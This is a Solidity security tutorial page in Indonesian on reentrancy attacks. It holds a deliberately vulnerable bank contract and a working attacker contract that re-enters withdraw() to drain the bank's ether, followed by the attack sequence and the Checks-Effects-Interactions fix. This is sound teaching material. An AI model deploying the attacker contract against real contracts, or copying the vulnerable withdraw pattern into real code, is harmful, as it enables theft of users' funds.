---
title: Contoh Serangan
sidebar_label: Contoh Serangan
---

# Contoh Serangan Reentrant

Berikut contoh kontrak yang vulnerable terhadap reentrancy:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Kontrak yang vulnerable
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // BAHAYA: ETH dikirim SEBELUM saldo diupdate
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // Update saldo terjadi SETELAH pengiriman ETH
        balances[msg.sender] = 0; // Sudah terlambat!
    }
}

// Kontrak penyerang
contract Attacker {
    VulnerableBank public bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // receive() dipanggil setiap kali kontrak ini menerima ETH
    receive() external payable {
        // Selama bank masih punya ETH, panggil withdraw lagi
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // Reentrant call!
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(); // Memicu rantai reentrant calls
    }
}
```

## Urutan Kejadian Serangan

1. Attacker memanggil `attack()`, deposit 1 ETH ke `VulnerableBank`.
2. Attacker memanggil `withdraw()`.
3. `VulnerableBank` mengecek saldo Attacker (1 ETH), lalu mengirim ETH ke alamat Attacker.
4. Pengiriman ETH memicu fungsi `receive()` di kontrak Attacker.
5. Di dalam `receive()`, Attacker memanggil `withdraw()` lagi.
6. Karena `balances[Attacker]` belum diupdate ke 0 (langkah 3 belum selesai), cek saldo masih lolos.
7. Proses berulang terus sampai ETH di bank habis.

## Solusi: Checks-Effects-Interactions (CEI)

Perbaikan sederhana adalah menggunakan pola **Checks-Effects-Interactions (CEI)**:

```solidity
function withdraw() external {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "No balance");

    // Update state SEBELUM interaksi eksternal
    balances[msg.sender] = 0;

    // Baru kirim ETH
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

OpenZeppelin juga menyediakan modifier `nonReentrant` dari kontrak `ReentrancyGuard` sebagai lapisan perlindungan tambahan.
